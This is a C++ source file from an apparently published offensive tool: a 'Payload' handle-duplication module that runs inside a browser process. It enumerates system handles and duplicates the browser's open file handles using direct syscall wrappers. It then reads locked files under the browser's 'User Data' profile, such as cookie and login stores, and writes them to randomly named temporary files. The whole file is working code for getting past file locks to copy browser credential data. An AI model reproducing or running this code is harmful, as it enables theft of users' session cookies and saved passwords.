// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "handle_duplicator.hpp"
#include <algorithm>
#include <fstream>
#include <random>
#include <TlHelp32.h>

namespace Payload {

    namespace {
        constexpr size_t HANDLE_BUFFER_SIZE = 32 * 1024 * 1024;  // 32 MB
        constexpr ULONG DUP_SAME_ACCESS = 0x00000002;

        std::string GenerateRandomFilename(size_t length = 16) {
            static constexpr char chars[] = "0123456789abcdefghijklmnopqrstuvwxyz";
            std::random_device rd;
            std::mt19937 gen(rd());
            std::uniform_int_distribution<> dist(0, sizeof(chars) - 2);
            
            std::string result;
            result.reserve(length);
            for (size_t i = 0; i < length; ++i) {
                result += chars[dist(gen)];
            }
            return result;
        }
    }

    HandleDuplicator::HandleDuplicator(LogCallback logger) : m_logger(std::move(logger)) {}

    void HandleDuplicator::Log(const std::string& msg) {
        if (m_logger) m_logger(msg);
    }

    bool HandleDuplicator::IsFileAccessible(const std::filesystem::path& path) {
        HANDLE h = CreateFileW(path.c_str(), GENERIC_READ, 
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            nullptr, OPEN_EXISTING, 0, nullptr);
        if (h != INVALID_HANDLE_VALUE) { CloseHandle(h); return true; }
        return GetLastError() != ERROR_SHARING_VIOLATION;
    }

    std::wstring HandleDuplicator::DosPathToNtPath(const std::filesystem::path& dosPath) {
        std::wstring path = std::filesystem::absolute(dosPath).wstring();
        if (path.length() >= 2 && path[1] == L':') {
            wchar_t drive[3] = { path[0], L':', L'\0' };
            wchar_t device[MAX_PATH] = { 0 };
            if (QueryDosDeviceW(drive, device, MAX_PATH) > 0) {
                return std::wstring(device) + path.substr(2);
            }
        }
        return path;
    }

    // Thread function for querying object name with timeout
    struct QueryNameContext {
        HANDLE handle;
        uint8_t buffer[4096];
        ULONG length;
        bool success;
    };

    static DWORD WINAPI QueryNameThread(LPVOID param) {
        auto* ctx = static_cast<QueryNameContext*>(param);
        ctx->success = NT_SUCCESS(NtQueryObject_syscall(ctx->handle, ObjectNameInformation, 
            ctx->buffer, sizeof(ctx->buffer), &ctx->length));
        return 0;
    }

    std::optional<std::wstring> HandleDuplicator::GetObjectName(HANDLE h) {
        // Use a thread with timeout to avoid hanging on named pipes
        QueryNameContext ctx = {};
        ctx.handle = h;
        
        HANDLE thread = CreateThread(nullptr, 0, QueryNameThread, &ctx, 0, nullptr);
        if (!thread) return std::nullopt;
        
        // Wait max 100ms for the query to complete
        DWORD result = WaitForSingleObject(thread, 100);
        if (result == WAIT_TIMEOUT) {
            TerminateThread(thread, 0);
            CloseHandle(thread);
            return std::nullopt;
        }
        CloseHandle(thread);
        
        if (ctx.success) {
            auto* info = reinterpret_cast<OBJECT_NAME_INFORMATION*>(ctx.buffer);
            if (info->Name.Length > 0 && info->Name.Buffer)
                return std::wstring(info->Name.Buffer, info->Name.Length / sizeof(wchar_t));
        }
        return std::nullopt;
    }

    Core::UniqueHandle HandleDuplicator::OpenProcessForDuplication(DWORD pid) {
        HANDLE h = nullptr;
        OBJECT_ATTRIBUTES oa = { sizeof(oa) };
        CLIENT_ID cid = { reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(pid)) };
        if (NT_SUCCESS(NtOpenProcess_syscall(&h, PROCESS_DUP_HANDLE, &oa, &cid)))
            return Core::UniqueHandle(h);
        return Core::UniqueHandle(nullptr);
    }

    std::optional<LONGLONG> HandleDuplicator::GetFileSizeViaHandle(HANDLE h) {
        IO_STATUS_BLOCK io = {};
        FILE_STANDARD_INFORMATION info = {};
        if (NT_SUCCESS(NtQueryInformationFile_syscall(h, &io, &info, sizeof(info), FileStandardInformation)))
            return info.EndOfFile.QuadPart;
        return std::nullopt;
    }

    std::vector<DWORD> HandleDuplicator::GetBrowserProcessPids() {
        std::vector<DWORD> pids;
        wchar_t exePath[MAX_PATH] = { 0 };
        GetModuleFileNameW(nullptr, exePath, MAX_PATH);
        std::wstring myExe = std::filesystem::path(exePath).filename().wstring();
        std::transform(myExe.begin(), myExe.end(), myExe.begin(), ::towlower);

        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = { sizeof(pe) };
            if (Process32FirstW(snap, &pe)) {
                do {
                    std::wstring name = pe.szExeFile;
                    std::transform(name.begin(), name.end(), name.begin(), ::towlower);
                    if (name == myExe) pids.push_back(pe.th32ProcessID);
                } while (Process32NextW(snap, &pe));
            }
            CloseHandle(snap);
        }
        return pids;
    }

    std::vector<HandleDuplicator::DuplicatedHandle> HandleDuplicator::DuplicateFileHandles(
        const std::filesystem::path& targetPath) 
    {
        std::vector<DuplicatedHandle> results;
        
        // Get target path suffix for matching
        std::wstring target = DosPathToNtPath(targetPath);
        std::transform(target.begin(), target.end(), target.begin(), ::towlower);
        std::wstring marker = L"\\user data\\";
        auto pos = target.find(marker);
        std::wstring targetSuffix = (pos != std::wstring::npos) ? target.substr(pos) : L"";
        if (targetSuffix.empty()) return results;

        // Get browser PIDs
        auto pids = GetBrowserProcessPids();
        if (pids.empty()) {
            if (m_logger) m_logger("No browser processes found");
            return results;
        }
        std::set<DWORD> pidSet(pids.begin(), pids.end());

        // Enumerate handles
        std::vector<uint8_t> buf(HANDLE_BUFFER_SIZE);
        ULONG len = 0;
        if (!NT_SUCCESS(NtQuerySystemInformation_syscall(SystemExtendedHandleInformation, 
            buf.data(), static_cast<ULONG>(buf.size()), &len))) return results;

        auto* info = reinterpret_cast<SYSTEM_HANDLE_INFORMATION_EX*>(buf.data());
        DWORD myPid = GetCurrentProcessId();
        HANDLE myProc = GetCurrentProcess();
        std::map<DWORD, Core::UniqueHandle> procCache;

        // First pass: collect only handles from browser processes
        std::vector<std::pair<DWORD, ULONG_PTR>> candidates;
        for (ULONG_PTR i = 0; i < info->NumberOfHandles; ++i) {
            const auto& e = info->Handles[i];
            DWORD pid = static_cast<DWORD>(e.UniqueProcessId);
            if (pid != myPid && pidSet.find(pid) != pidSet.end()) {
                candidates.emplace_back(pid, e.HandleValue);
            }
        }

        // Process candidates
        for (const auto& [pid, handleVal] : candidates) {
            if (!results.empty()) break;

            HANDLE srcProc = nullptr;
            auto it = procCache.find(pid);
            if (it != procCache.end()) srcProc = it->second.get();
            else {
                auto h = OpenProcessForDuplication(pid);
                if (h) { srcProc = h.get(); procCache[pid] = std::move(h); }
            }
            if (!srcProc) continue;

            HANDLE dup = nullptr;
            if (!NT_SUCCESS(NtDuplicateObject_syscall(srcProc, 
                reinterpret_cast<HANDLE>(handleVal), myProc, &dup, 0, 0, DUP_SAME_ACCESS)) || !dup)
                continue;
            Core::UniqueHandle dupHandle(dup);
            auto name = GetObjectName(dupHandle.get());
            if (!name) continue;

            // Check path match
            std::wstring nameLower = *name;
            std::transform(nameLower.begin(), nameLower.end(), nameLower.begin(), ::towlower);
            
            auto objPos = nameLower.find(marker);
            if (objPos != std::wstring::npos && nameLower.substr(objPos) == targetSuffix) {
                DuplicatedHandle r;
                r.handle = std::move(dupHandle);
                r.sourcePid = pid;
                r.originalHandle = handleVal;
                r.objectName = *name;
                results.push_back(std::move(r));
            }
        }
        return results;
    }

    std::optional<std::vector<uint8_t>> HandleDuplicator::ReadFileViaHandle(HANDLE h) {
        auto size = GetFileSizeViaHandle(h);
        if (!size || *size <= 0 || *size > 100 * 1024 * 1024) return std::nullopt;

        std::vector<uint8_t> data(static_cast<size_t>(*size));
        IO_STATUS_BLOCK io = {};
        LARGE_INTEGER offset = { 0 };
        
        NTSTATUS status = NtReadFile_syscall(h, nullptr, nullptr, nullptr, &io, 
            data.data(), static_cast<ULONG>(*size), &offset, nullptr);
        
        if (status == STATUS_PENDING) {
            WaitForSingleObject(h, 5000);
            status = static_cast<NTSTATUS>(io.Status);
        }
        
        if (NT_SUCCESS(status) && io.Information > 0) {
            data.resize(static_cast<size_t>(io.Information));
            return data;
        }
        return std::nullopt;
    }

    std::optional<std::filesystem::path> HandleDuplicator::CopyLockedFile(
        const std::filesystem::path& sourcePath,
        const std::filesystem::path& destDir)
    {
        if (IsFileAccessible(sourcePath)) return std::nullopt;

        // Retry up to 5 times with delay (process may need time to reopen file)
        std::vector<DuplicatedHandle> handles;
        for (int attempt = 0; attempt < 5 && handles.empty(); ++attempt) {
            if (attempt > 0) Sleep(800);
            handles = DuplicateFileHandles(sourcePath);
        }

        for (auto& h : handles) {
            auto data = ReadFileViaHandle(h.handle.get());
            if (!data) continue;
            
            std::filesystem::create_directories(destDir);
            auto temp = destDir / (GenerateRandomFilename() + ".tmp");
            
            std::ofstream f(temp, std::ios::binary);
            if (f) {
                f.write(reinterpret_cast<const char*>(data->data()), data->size());
                f.close();
                if (f.good()) return temp;
            }
            std::filesystem::remove(temp);
        }
        return std::nullopt;
    }

}
